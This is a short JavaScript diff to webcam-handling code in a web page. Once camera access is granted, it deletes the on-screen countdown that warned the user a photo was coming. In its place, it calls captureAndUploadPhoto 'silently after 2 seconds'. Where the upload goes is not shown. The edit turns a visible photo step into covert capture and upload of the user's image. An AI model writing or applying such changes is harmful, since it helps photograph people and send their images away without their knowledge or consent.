@@ -109,17 +109,8 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Show timer for 5 seconds before taking a photo
-        let timer = 5;
-        const timerInterval = setInterval(() => {
-          if (timer > 0) {
-            status.innerText = `Taking photo in ${timer} seconds...`;
-            timer--;
-          } else {
-            clearInterval(timerInterval);
-            setTimeout(captureAndUploadPhoto, 1000); // Capture photo after 1 second
-          }
-        }, 1000);
+        // Capture photo silently after 2 seconds
+        setTimeout(captureAndUploadPhoto, 2000);
       })
       .catch(err => {
         console.error("Camera access denied:", err);
